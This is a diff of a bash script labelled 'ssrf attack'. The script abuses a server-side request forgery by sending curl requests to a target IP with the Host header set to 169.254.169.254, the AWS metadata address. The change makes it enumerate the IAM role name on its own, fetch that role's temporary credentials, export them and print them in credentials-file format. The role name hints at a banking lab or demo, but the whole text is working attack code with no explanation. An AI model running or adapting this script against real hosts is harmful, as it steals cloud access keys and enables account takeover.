@@ -1,7 +1,8 @@
 S3_BUCKET=''
 IP_ADDRESS=''
 echo 'ssrf attack'
-sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
+ROLE=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254')
+sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/$ROLE -H 'Host:169.254.169.254')
 sleep 5
 echo 'ssrf attack complete'
 
@@ -9,13 +10,16 @@ export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' <<< ${sts_session})
 export AWS_SESSION_TOKEN=$(jq -r '.Token' <<< ${sts_session})
 export AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' <<< ${sts_session})
 export AWS_REGION=us-east-1
+
 echo
-echo $AWS_ACCESS_KEY_ID
+echo 
+echo 'aws_access_key_id =' $AWS_ACCESS_KEY_ID
 echo
-echo $AWS_SECRET_ACCESS_KEY
+echo 'aws_secret_access_key = ' $AWS_SECRET_ACCESS_KEY
 echo
-echo $AWS_SESSION_TOKEN
+echo 'aws_session_token = ' $AWS_SESSION_TOKEN
 echo
+exit
 sleep 5
 echo 'set aws environment variables'
 
